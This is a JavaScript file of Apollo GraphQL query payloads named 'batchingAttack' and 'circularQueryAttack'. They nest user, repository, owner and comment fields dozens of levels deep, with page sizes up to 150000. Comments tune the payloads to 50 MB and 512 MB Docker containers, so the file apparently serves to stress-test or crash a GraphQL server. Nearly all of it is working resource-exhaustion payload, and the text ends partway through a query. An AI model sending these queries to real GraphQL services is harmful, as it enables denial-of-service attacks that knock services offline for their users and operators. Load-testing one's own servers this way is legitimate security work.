const { gql } = require('@apollo/client');

const queries = {
 /* batchingAttack: gql`
  query {
    users(first: 100) {
      edges {
        node {
          id
          login
          name
          repositories(first: 30) {
            nodes {
              id
              name
              description
              owner {
                id
                login
                name
                repositories(first: 30) {
                  nodes {
                    id
                    name
                    description
                    owner {
                      id
                      login
                      name
                      repositories(first: 30) {
                        nodes {
                          id
                          name
                          description
                          owner {
                            id
                            login
                            name
                            repositories(first: 30) {
                              nodes {
                                id
                                name
                                description
                                owner {
                                  id
                                  login
                                  name
                                  repositories(first: 30) {
                                    nodes {
                                      id
                                      name
                                      description
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      pageInfo {
        endCursor
        hasNextPage
      }
    }
  }
  ` */

// query for 50mb docker
/*  batchingAttack: gql`
  query {
    users(first: 150) {  # Reduced the number of users to fetch
      edges {
        node {
          id
          login
          name
          repositories(first: 75) {  # Reduced the number of repositories per user
            nodes {
              id
              name
              description
              owner {
                id
                login
                name
                repositories(first: 50) {  # Reduced nesting and complexity
                  nodes {
                    id
                    name
                    description
                    owner {
                      id
                      login
                      name
                      repositories(first: 50) {  # Further reduced nesting
                        nodes {
                          id
                          name
                          description
                          owner {
                            id
                            login
                            name
                            repositories(first: 50) {  # Another level of nesting but reduced size
                              nodes {
                                id
                                name
                                description
                                owner {
                                  id
                                  login
                                  name
                                  repositories(first: 50) {  # Further reduced complexity
                                    nodes {
                                      id
                                      name
                                      description
                                      owner {
                                        id
                                        login
                                        name
                                        repositories(first: 50) {  # Reduced depth and size
                                          nodes {
                                            id
                                            name
                                            description
                                            owner {
                                              id
                                              login
                                              name
                                              repositories(first: 50) {  # Reduced deep nesting
                                                nodes {
                                                  id
                                                  name
                                                  description
                                                  owner {
                                                    id
                                                    login
                                                    name
                                                    repositories(first: 50) {
                                                      nodes {
                                                        id
                                                        name
                                                        description
                                                        owner {
                                                          id
                                                          login
                                                          name
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
      pageInfo {
        endCursor
        hasNextPage
      }
    }
  }
  `
*/  
  
//512mb docker
batchingAttack: gql`
query {
  users(first: 200) {  # Increased the number of users to fetch
    edges {
      node {
        id
        login
        name
        repositories(first: 100) {  # Increased the number of repositories per user
          nodes {
            id
            name
            description
            owner {
              id
              login
              name
              repositories(first: 100) {  # Increased nesting and complexity
                nodes {
                  id
                  name
                  description
                  owner {
                    id
                    login
                    name
                    repositories(first: 100) {  # Further deep nesting
                      nodes {
                        id
                        name
                        description
                        owner {
                          id
                          login
                          name
                          repositories(first: 100) {  # Another level of deep nesting
                            nodes {
                              id
                              name
                              description
                              owner {
                                id
                                login
                                name
                                repositories(first: 100) {  # Further increase in complexity
                                  nodes {
                                    id
                                    name
                                    description
                                    owner {
                                      id
                                      login
                                      name
                                      repositories(first: 100) {  # Increased depth and size
                                        nodes {
                                          id
                                          name
                                          description
                                          owner {
                                            id
                                            login
                                            name
                                            repositories(first: 100) {  # More levels of deep nesting
                                              nodes {
                                                id
                                                name
                                                description
                                                owner {
                                                  id
                                                  login
                                                  name
                                                  repositories(first: 100) {  # Maximum depth for high complexity
                                                    nodes {
                                                      id
                                                      name
                                                      description
                                                      owner {
                                                        id
                                                        login
                                                        name
                                                        repositories(first: 100) {
                                                          nodes {
                                                            id
                                                            name
                                                            description
                                                            owner {
                                                              id
                                                              login
                                                              name
                                                              repositories(first: 100) {
                                                                nodes {
                                                                  id
                                                                  name
                                                                  description
                                                                  owner {
                                                                    id
                                                                    login
                                                                    name
                                                                    repositories(first: 100) {
                                                                      nodes {
                                                                        id
                                                                        name
                                                                        description
                                                                        owner {
                                                                          id
                                                                          login
                                                                          name
                                                                          repositories(first: 100) {
                                                                            nodes {
                                                                              id
                                                                              name
                                                                              description
                                                                              owner {
                                                                                id
                                                                                login
                                                                                name
                                                                                repositories(first: 100) {
                                                                                  nodes {
                                                                                    id
                                                                                    name
                                                                                    description
                                                                                    owner {
                                                                                      id
                                                                                      login
                                                                                      name
                                                                                      repositories(first: 100) {
                                                                                        nodes {
                                                                                          id
                                                                                          name
                                                                                          description
                                                                                          owner {
                                                                                            id
                                                                                            login
                                                                                            name
                                                                                            repositories(first: 100) {
                                                                                              nodes {
                                                                                                id
                                                                                                name
                                                                                                description
                                                                                                owner {
                                                                                                  id
                                                                                                  login
                                                                                                  name
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    pageInfo {
      endCursor
      hasNextPage
    }
  }
}
`
,

/*circularQueryAttack: gql`
query {
  user(login: "someUser") {
    id
    login
    name
    repositories(first: 150000) {
      nodes {
        id
        name
        description
        owner {
          id
          login
          name
          repositories(first: 150000) {
            nodes {
              id
              name
              description
              owner {
                id
                login
                name
                repositories(first: 150000) {
                  nodes {
                    id
                    name
                    description
                    owner {
                      id
                      login
                      name
                      repositories(first: 150000) {
                        nodes {
                          id
                          name
                          description
                          owner {
                            id
                            login
                            name
                            repositories(first: 150000) {
                              nodes {
                                id
                                name
                                description
                                owner {
                                  id
                                  login
                                  name
                                  repositories(first: 150000) {
                                    nodes {
                                      id
                                      name
                                      description
                                      owner {
                                        id
                                        login
                                        name
                                        repositories(first: 150000) {
                                          nodes {
                                            id
                                            name
                                            description
                                            owner {
                                              id
                                              login
                                              name
                                              repositories(first: 150000) {
                                                nodes {
                                                  id
                                                  name
                                                  description
                                                  owner {
                                                    id
                                                    login
                                                    name
                                                    repositories(first: 150000) {
                                                      nodes {
                                                        id
                                                        name
                                                        description
                                                        owner {
                                                          id
                                                          login
                                                          name
                                                          repositories(first: 150000) {
                                                            nodes {
                                                              id
                                                              name
                                                              description
                                                              owner {
                                                                id
                                                                login
                                                                name
                                                                repositories(first: 150000) {
                                                                  nodes {
                                                                    id
                                                                    name
                                                                    description
                                                                    owner {
                                                                      id
                                                                      login
                                                                      name
                                                                      repositories(first: 150000) {
                                                                        nodes {
                                                                          id
                                                                          name
                                                                          description
                                                                          owner {
                                                                            id
                                                                            login
                                                                            name
                                                                            repositories(first: 150000) {
                                                                              nodes {
                                                                                id
                                                                                name
                                                                                description
                                                                                owner {
                                                                                  id
                                                                                  login
                                                                                  name
                                                                                  repositories(first: 150000) {
                                                                                    nodes {
                                                                                      id
                                                                                      name
                                                                                      description
                                                                                      owner {
                                                                                        id
                                                                                        login
                                                                                        name
                                                                                        repositories(first: 150000) {
                                                                                          nodes {
                                                                                            id
                                                                                            name
                                                                                            description
                                                                                            owner {
                                                                                              id
                                                                                              login
                                                                                              name
                                                                                              repositories(first: 150000) {
                                                                                                nodes {
                                                                                                  id
                                                                                                  name
                                                                                                  description
                                                                                                  owner {
                                                                                                    id
                                                                                                    login
                                                                                                    name
                                                                                                    repositories(first: 150000) {
                                                                                                      nodes {
                                                                                                        id
                                                                                                        name
                                                                                                        description
                                                                                                        owner {
                                                                                                          id
                                                                                                          login
                                                                                                          name
                                                                                                          repositories(first: 150000) {
                                                                                                            nodes {
                                                                                                              id
                                                                                                              name
                                                                                                              description
                                                                                                              owner {
                                                                                                                id
                                                                                                                login
                                                                                                                name
                                                                                                                repositories(first: 150000) {
                                                                                                                  nodes {
                                                                                                                    id
                                                                                                                    name
                                                                                                                    description
                                                                                                                    owner {
                                                                                                                      id
                                                                                                                      login
                                                                                                                      name
                                                                                                                      repositories(first: 150000) {
                                                                                                                        nodes {
                                                                                                                          id
                                                                                                                          name
                                                                                                                          description
                                                                                                                          owner {
                                                                                                                            id
                                                                                                                            login
                                                                                                                            name
                                                                                                                            repositories(first: 150000) {
                                                                                                                              nodes {
                                                                                                                                id
                                                                                                                                name
                                                                                                                                description
                                                                                                                                owner {
                                                                                                                                  id
                                                                                                                                  login
                                                                                                                                  name
                                                                                                                                  repositories(first: 150000) {
                                                                                                                                    nodes {
                                                                                                                                      id
                                                                                                                                      name
                                                                                                                                      description
                                                                                                                                      owner {
                                                                                                                                        id
                                                                                                                                        login
                                                                                                                                        name
                                                                                                                                        repositories(first: 150000) {
                                                                                                                                          nodes {
                                                                                                                                            id
                                                                                                                                            name
                                                                                                                                            description
                                                                                                                                            owner {
                                                                                                                                              id
                                                                                                                                              login
                                                                                                                                              name
                                                                                                                                              repositories(first: 150000) {
                                                                                                                                                nodes {
                                                                                                                                                  id
                                                                                                                                                  name
                                                                                                                                                  description
                                                                                                                                                  owner {
                                                                                                                                                    id
                                                                                                                                                    login
                                                                                                                                                    name
                                                                                                                                                    repositories(first: 150000) {
                                                                                                                                                      nodes {
                                                                                                                                                        id
                                                                                                                                                        name
                                                                                                                                                        description
                                                                                                                                                        owner {
                                                                                                                                                          id
                                                                                                                                                          login
                                                                                                                                                          name
                                                                                                                                                          repositories(first: 150000) {
                                                                                                                                                            nodes {
                                                                                                                                                              id
                                                                                                                                                              name
                                                                                                                                                              description
                                                                                                                                                              owner {
                                                                                                                                                                id
                                                                                                                                                                login
                                                                                                                                                                name
                                                                                                                                                                repositories(first: 150000) {
                                                                                                                                                                  nodes {
                                                                                                                                                                    id
                                                                                                                                                                    name
                                                                                                                                                                    description
                                                                                                                                                                    owner {
                                                                                                                                                                      id
                                                                                                                                                                      login
                                                                                                                                                                      name
                                                                                                                                                                      repositories(first: 150000) {
                                                                                                                                                                        nodes {
                                                                                                                                                                          id
                                                                                                                                                                          name
                                                                                                                                                                          description
                                                                                                                                                                          owner {
                                                                                                                                                                            id
                                                                                                                                                                            login
                                                                                                                                                                            name
                                                                                                                                                                            repositories(first: 150000) {
                                                                                                                                                                              nodes {
                                                                                                                                                                                id
                                                                                                                                                                                name
                                                                                                                                                                                description
                                                                                                                                                                                owner {
                                                                                                                                                                                  id
                                                                                                                                                                                  login
                                                                                                                                                                                  name
                                                                                                                                                                                  repositories(first: 150000) {
                                                                                                                                                                                    nodes {
                                                                                                                                                                                      id
                                                                                                                                                                                      name
                                                                                                                                                                                      description
                                                                                                                                                                                      owner {
                                                                                                                                                                                        id
                                                                                                                                                                                        login
                                                                                                                                                                                        name
                                                                                                                                                                                        repositories(first: 150000) {
                                                                                                                                                                                          nodes {
                                                                                                                                                                                            id
                                                                                                                                                                                            name
                                                                                                                                                                                            description
                                                                                                                                                                                            owner {
                                                                                                                                                                                              id
                                                                                                                                                                                              login
                                                                                                                                                                                              name
                                                                                                                                                                                              repositories(first: 150000) {
                                                                                                                                                                                                nodes {
                                                                                                                                                                                                  id
                                                                                                                                                                                                  name
                                                                                                                                                                                                  description
                                                                                                                                                                                                  owner {
                                                                                                                                                                                                    id
                                                                                                                                                                                                    login
                                                                                                                                                                                                    name
                                                                                                                                                                                                    repositories(first: 150000) {
                                                                                                                                                                                                      nodes {
                                                                                                                                                                                                        id
                                                                                                                                                                                                        name
                                                                                                                                                                                                        description
                                                                                                                                                                                                        owner {
                                                                                                                                                                                                          id
                                                                                                                                                                                                          login
                                                                                                                                                                                                          name
                                                                                                                                                                                                          repositories(first: 150000) {
                                                                                                                                                                                                            nodes {
                                                                                                                                                                                                              id
                                                                                                                                                                                                              name
                                                                                                                                                                                                              description
                                                                                                                                                                                                              owner {
                                                                                                                                                                                                                id
                                                                                                                                                                                                                login
                                                                                                                                                                                                                name
                                                                                                                                                                                                                repositories(first: 150000) {
                                                                                                                                                                                                                  nodes {
                                                                                                                                                                                                                    id
                                                                                                                                                                                                                    name
                                                                                                                                                                                                                    description
                                                                                                                                                                                                                    owner {
                                                                                                                                                                                                                      id
                                                                                                                                                                                                                      login
                                                                                                                                                                                                                      name
                                                                                                                                                                                                                      repositories(first: 150000) {
                                                                                                                                                                                                                        nodes {
                                                                                                                                                                                                                          id
                                                                                                                                                                                                                          name
                                                                                                                                                                                                                          description
                                                                                                                                                                                                                          owner {
                                                                                                                                                                                                                            id
                                                                                                                                                                                                                            login
                                                                                                                                                                                                                            name
                                                                                                                                                                                                                            repositories(first: 150000) {
                                                                                                                                                                                                                              nodes {
                                                                                                                                                                                                                                id
                                                                                                                                                                                                                                name
                                                                                                                                                                                                                                description
                                                                                                                                                                                                                                owner {
                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                  login
                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                  repositories(first: 150000) {
                                                                                                                                                                                                                                    nodes {
                                                                                                                                                                                                                                      id
                                                                                                                                                                                                                                      name
                                                                                                                                                                                                                                      description
                                                                                                                                                                                                                                      owner {
                                                                                                                                                                                                                                        id
                                                                                                                                                                                                                                        login
                                                                                                                                                                                                                                        name
                                                                                                                                                                                                                                        repositories(first: 150000) {
                                                                                                                                                                                                                                          nodes {
                                                                                                                                                                                                                                            id
                                                                                                                                                                                                                                            name
                                                                                                                                                                                                                                            description
                                                                                                                                                                                                                                            owner {
                                                                                                                                                                                                                                              id
                                                                                                                                                                                                                                              login
                                                                                                                                                                                                                                              name
                                                                                                                                                                                                                                              repositories(first: 150000) {
                                                                                                                                                                                                                                                nodes {
                                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                                  description
                                                                                                                                                                                                                                                  owner {
                                                                                                                                                                                                                                                    id
                                                                                                                                                                                                                                                    login
                                                                                                                                                                                                                                                    name
                                                                                                                                                                                                                                                    repositories(first: 150000) {
                                                                                                                                                                                                                                                      nodes {
                                                                                                                                                                                                                                                        id
                                                                                                                                                                                                                                                        name
                                                                                                                                                                                                                                                        description
                                                                                                                                                                                                                                                        owner {
                                                                                                                                                                                                                                                          id
                                                                                                                                                                                                                                                          login
                                                                                                                                                                                                                                                          name
                                                                                                                                                                                                                                                          repositories(first: 150000) {
                                                                                                                                                                                                                                                            nodes {
                                                                                                                                                                                                                                                              id
                                                                                                                                                                                                                                                              name
                                                                                                                                                                                                                                                              description
                                                                                                                                                                                                                                                              owner {
                                                                                                                                                                                                                                                                id
                                                                                                                                                                                                                                                                login
                                                                                                                                                                                                                                                                name
                                                                                                                                                                                                                                                                repositories(first: 150000) {
                                                                                                                                                                                                                                                                  nodes {
                                                                                                                                                                                                                                                                    id
                                                                                                                                                                                                                                                                    name
                                                                                                                                                                                                                                                                    description
                                                                                                                                                                                                                                                                    owner {
                                                                                                                                                                                                                                                                      id
                                                                                                                                                                                                                                                                      login
                                                                                                                                                                                                                                                                      name
                                                                                                                                                                                                                                                                      repositories(first: 150000) {
                                                                                                                                                                                                                                                                        nodes {
                                                                                                                                                                                                                                                                          id
                                                                                                                                                                                                                                                                          name
                                                                                                                                                                                                                                                                          description
                                                                                                                                                                                                                                                                          owner {
                                                                                                                                                                                                                                                                            id
                                                                                                                                                                                                                                                                            login
                                                                                                                                                                                                                                                                            name
                                                                                                                                                                                                                                                                            repositories(first: 150000) {
                                                                                                                                                                                                                                                                              nodes {
                                                                                                                                                                                                                                                                                id
                                                                                                                                                                                                                                                                                name
                                                                                                                                                                                                                                                                                description
                                                                                                                                                                                                                                                                                owner {
                                                                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                                                                  login
                                                                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                                                                  repositories(first: 150000) {
                                                                                                                                                                                                                                                                                    nodes {
                                                                                                                                                                                                                                                                                      id
                                                                                                                                                                                                                                                                                      name
                                                                                                                                                                                                                                                                                      description
                                                                                                                                                                                                                                                                                      owner {
                                                                                                                                                                                                                                                                                        id
                                                                                                                                                                                                                                                                                        login
                                                                                                                                                                                                                                                                                        name
                                                                                                                                                                                                                                                                                        repositories(first: 150000) {
                                                                                                                                                                                                                                                                                          nodes {
                                                                                                                                                                                                                                                                                            id
                                                                                                                                                                                                                                                                                            name
                                                                                                                                                                                                                                                                                            description
                                                                                                                                                                                                                                                                                            owner {
                                                                                                                                                                                                                                                                                              id
                                                                                                                                                                                                                                                                                              login
                                                                                                                                                                                                                                                                                              name
                                                                                                                                                                                                                                                                                              repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                nodes {
                                                                                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                                                                                  description
                                                                                                                                                                                                                                                                                                  owner {
                                                                                                                                                                                                                                                                                                    id
                                                                                                                                                                                                                                                                                                    login
                                                                                                                                                                                                                                                                                                    name
                                                                                                                                                                                                                                                                                                    repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                      nodes {
                                                                                                                                                                                                                                                                                                        id
                                                                                                                                                                                                                                                                                                        name
                                                                                                                                                                                                                                                                                                        description
                                                                                                                                                                                                                                                                                                        owner {
                                                                                                                                                                                                                                                                                                          id
                                                                                                                                                                                                                                                                                                          login
                                                                                                                                                                                                                                                                                                          name
                                                                                                                                                                                                                                                                                                          repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                            nodes {
                                                                                                                                                                                                                                                                                                              id
                                                                                                                                                                                                                                                                                                              name
                                                                                                                                                                                                                                                                                                              description
                                                                                                                                                                                                                                                                                                              owner {
                                                                                                                                                                                                                                                                                                                id
                                                                                                                                                                                                                                                                                                                login
                                                                                                                                                                                                                                                                                                                name
                                                                                                                                                                                                                                                                                                                repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                  nodes {
                                                                                                                                                                                                                                                                                                                    id
                                                                                                                                                                                                                                                                                                                    name
                                                                                                                                                                                                                                                                                                                    description
                                                                                                                                                                                                                                                                                                                    owner {
                                                                                                                                                                                                                                                                                                                      id
                                                                                                                                                                                                                                                                                                                      login
                                                                                                                                                                                                                                                                                                                      name
                                                                                                                                                                                                                                                                                                                      repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                        nodes {
                                                                                                                                                                                                                                                                                                                          id
                                                                                                                                                                                                                                                                                                                          name
                                                                                                                                                                                                                                                                                                                          description
                                                                                                                                                                                                                                                                                                                          owner {
                                                                                                                                                                                                                                                                                                                            id
                                                                                                                                                                                                                                                                                                                            login
                                                                                                                                                                                                                                                                                                                            name
                                                                                                                                                                                                                                                                                                                            repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                              nodes {
                                                                                                                                                                                                                                                                                                                                id
                                                                                                                                                                                                                                                                                                                                name
                                                                                                                                                                                                                                                                                                                                description
                                                                                                                                                                                                                                                                                                                                owner {
                                                                                                                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                                                                                                                  login
                                                                                                                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                                                                                                                  repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                                    nodes {
                                                                                                                                                                                                                                                                                                                                      id
                                                                                                                                                                                                                                                                                                                                      name
                                                                                                                                                                                                                                                                                                                                      description
                                                                                                                                                                                                                                                                                                                                      owner {
                                                                                                                                                                                                                                                                                                                                        id
                                                                                                                                                                                                                                                                                                                                        login
                                                                                                                                                                                                                                                                                                                                        name
                                                                                                                                                                                                                                                                                                                                        repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                                          nodes {
                                                                                                                                                                                                                                                                                                                                            id
                                                                                                                                                                                                                                                                                                                                            name
                                                                                                                                                                                                                                                                                                                                            description
                                                                                                                                                                                                                                                                                                                                            owner {
                                                                                                                                                                                                                                                                                                                                              id
                                                                                                                                                                                                                                                                                                                                              login
                                                                                                                                                                                                                                                                                                                                              name
                                                                                                                                                                                                                                                                                                                                              repositories(first: 150000) {
                                                                                                                                                                                                                                                                                                                                                nodes {
                                                                                                                                                                                                                                                                                                                                                  id
                                                                                                                                                                                                                                                                                                                                                  name
                                                                                                                                                                                                                                                                                                                                                  description
                                                                                                                                                                                                                                                                                                                                                  owner {
                                                                                                                                                                                                                                                                                                                                                    id
                                                                                                                                                                                                                                                                                                                                                    login
                                                                                                                                                                                                                                                                                                                                                    name
                                                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                  }
                                                                                                                                                                                                                                }
                                                                                                                                                                                                                              }
                                                                                                                                                                                                                            }
                                                                                                                                                                                                                          }
                                                                                                                                                                                                                        }
                                                                                                                                                                                                                      }
                                                                                                                                                                                                                    }
                                                                                                                                                                                                                  }
                                                                                                                                                                                                                }
                                                                                                                                                                                                              }
                                                                                                                                                                                                            }
                                                                                                                                                                                                          }
                                                                                                                                                                                                        }
                                                                                                                                                                                                      }
                                                                                                                                                                                                    }
                                                                                                                                                                                                  }
                                                                                                                                                                                                }
                                                                                                                                                                                              }
                                                                                                                                                                                            }
                                                                                                                                                                                          }
                                                                                                                                                                                        }
                                                                                                                                                                                      }
                                                                                                                                                                                    }
                                                                                                                                                                                  }
                                                                                                                                                                                }
                                                                                                                                                                              }
                                                                                                                                                                            }
                                                                                                                                                                          }
                                                                                                                                                                        }
                                                                                                                                                                      }
                                                                                                                                                                    }
                                                                                                                                                                  }
                                                                                                                                                                }
                                                                                                                                                              }
                                                                                                                                                            }
                                                                                                                                                          }
                                                                                                                                                        }
                                                                                                                                                      }
                                                                                                                                                    }
                                                                                                                                                  }
                                                                                                                                                }
                                                                                                                                              }
                                                                                                                                            }
                                                                                                                                          }
                                                                                                                                        }
                                                                                                                                      }
                                                                                                                                    }
                                                                                                                                  }
                                                                                                                                }
                                                                                                                              }
                                                                                                                            }
                                                                                                                          }
                                                                                                                        }
                                                                                                                      }
                                                                                                                    }
                                                                                                                  }
                                                                                                                }
                                                                                                              }
                                                                                                            }
                                                                                                          }
                                                                                                        }
                                                                                                      }
                                                                                                    }
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
`*/
circularQueryAttack: gql`
query {
  user(login: "someUser") {
    id
    login
    name
    repositories(first: 5000) {
      nodes {
        id
        name
        description
        comments(first: 5000) {  # Adding comments field
          edges {
            node {
              id
              content
              user {
                id
                login
                name
              }
            }
          }
        }
        owner {
          id
          login
          name
          repositories(first: 5000) {
            nodes {
              id
              name
              description
              comments(first: 5000) {  # Adding comments field
                edges {
                  node {
                    id
                    content
                    user {
                      id
                      login
                      name
                    }
                  }
                }
              }
              owner {
                id
                login
                name
                repositories(first: 5000) {
                  nodes {
                    id
                    name
                    description
                    comments(first: 5000) {  # Adding comments field
                      edges {
                        node {
                          id
                          content
                          user {
                            id
                            login
                            name
                          }
                        }
                      }
                    }
                    owner {
                      id
                      login
                      name
                      repositories(first: 5000) {
                        nodes {
                          id
                          name
                          description
                          comments(first: 5000) {  # Adding comments field
                            edges {
                              node {
                                id
                                content
                                user {
                                  id
                                  login
                                  name
                                }
                              }
                            }
                          }
                          owner {
                            id
                            login
                            name
                            repositories(first: 5000) {
                              nodes {
                                id
                                name
                                description
                                comments(first: 5000) {  # Adding comments field
                                  edges {
                                    node {
                                      id
                                      content
                                      user {
                                        id
                                        login
                                        name
                                      }
                                    }
                                  }
                                }
                                owner {
                                  id
                                  login
                                  name
                                  repositories(first: 5000) {
                                    nodes {
                                      id
                                      name
                                      description
                                      comments(first: 5000) {  # Adding comments field
                                        edges {
                                          node {
                                            id
                                            content
                                            user {
                                              id
                                              login
                                              name
                                            }
                                          }
                                        }
                                      }
                                      owner {
                                        id
                                        login
                                        name
                                        repositories(first: 5000) {
                                          nodes {
                                            id
                                            name
                                            description
                                            comments(first: 5000) {  # Adding comments field
                                              edges {
                                                node {
                                                  id
                                                  content
                                                  user {
                                                    id
                                                    login
                                                    name
                                                  }
                                                }
                                              }
                                            }
                                            owner {
                                              id
                                              login
                                              name
                                              repositories(first: 5000) {
                                                nodes {
                                                  id
                                                  name
                                                  description
                                                  comments(first: 5000) {  # Adding comments field
                                                    edges {
                                                      node {
                                                        id
                                                        content
                                                        user {
                                                          id
                                                          login
                                                          name
                                                        }
                                                      }
                                                    }
                                                  }
                                                  owner {
                                                    id
                                                    login
                                                    name
                                                    repositories(first: 5000) {
                                                      nodes {
                                                        id
                                                        name
                                                        description
                                                        comments(first: 5000) {  # Adding comments field
                                                          edges {
                                                            node {
                                                              id
                                                              content
                                                              user {
                                                                id
                                                                login
                                                                name
                                                              }
                                                            }
                                                          }
                                                        }
                                                        owner {
                                                          id
                                                          login
                                                          name
                                                          repositories(first: 5000) {
                                                            nodes {
                                                              id
                                                              name
                                                              description
                                                              comments(first: 5000) {  # Adding comments field
                                                                edges {
                                                                  node {
                                                                    id
                                                                    content
                                                                    user {
                                                                      id
                                                                      login
                                                                      name
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                              owner {
                                                                id
                                                                login
                                                                name
                                                                repositories(first: 5000) {
                                                                  nodes {
                                                                    id
                                                                    name
                                                                    description
                                                                    comments(first: 5000) {  # Adding comments field
                                                                      edges {
                                                                        node {
                                                                          id
                                                                          content
                                                                          user {
                                                                            id
                                                                            login
                                                                            name
                                                                          }
                                                                        }
                                                                      }
                                                                    }
                                                                    owner {
                                                                      id
                                                                      login
                                                                      name
                                                                      repositories(first: 5000) {
                                                                        nodes {
                                                                          id
                                                                          name
                                                                          description
                                                                          comments(first: 5000) {  # Adding comments field
                                                                            edges {
                                                                              node {
                                                                                id
                                                                                content
                                                                                user {
                                                                                  id
                                                                                  login
                                                                                  name
                                                                                }
                                                                              }
                                                                            }
                                                                          }
                                                                          owner {
                                                                            id
                                                                            login
                                                                            name
                                                                            repositories(first: 5000) {
                                                                              nodes {
                                                                                id
                                                                                name
                                                                                description
                                                                                comments(first: 5000) {  # Adding comments field
                                                                                  edges {
                                                                                    node {
                                                                                      id
                                                                                      content
                                                                                      user {
                                                                                        id
                                                                                        login
                                                                                        name
                                                                                      }
                                                                                    }
                                                                                  }
                                                                                }
                                                                                owner {
                                                                                  id
                                                                                  login
                                                                                  name
                                                                                  repositories(first: 5000) {
                                                                                    nodes {
                                                                                      id
                                                                                      name
                                                                                      description
                                                                                      comments(first: 5000) {  # Adding comments field
                                                                                        edges {
                                                                                          node {
                                                                                            id
                                                                                            content
                                                                                            user {
                                                                                              id
                                                                                              login
                                                                                              name
                                                                                            }
                                                                                          }
                                                                                        }
                                                                                      }
                                                                                      owner {
                                                                                        id
                                                                                        login
                                                                                        name
                                                                                        repositories(first: 5000) {
                                                                                          nodes {
                                                                                            id
                                                                                            name
                                                                                            description
                                                                                            comments(first: 5000) {  # Adding comments field
                                                                                              edges {
                                                                                                node {
                                                                                                  id
                                                                                                  content
                                                                                                  user {
                                                                                                    id
                                                                                                    login
                                                                                                    name
                                                                                                  }
                                                                                                }
                                                                                              }
                                                                                            }
                                                                                            owner {
                                                                                              id
                                                                                              login
                                                                                              name
                                                                                              repositories(first: 5000) {
                                                                                                nodes {
                                                                                                  id
                                                                                                  name
                                                                                                  description
                                                                                                  comments(first: 5000) {  # Adding comments field
                                                                                                    edges {
                                                                                                      node {
                                                                                                        id
                                                                                                        content
                                                                                                        user {
                                                                                                          id
                                                                                                          login
                                                                                                          name
                                                                                                        }
                                                                                                      }
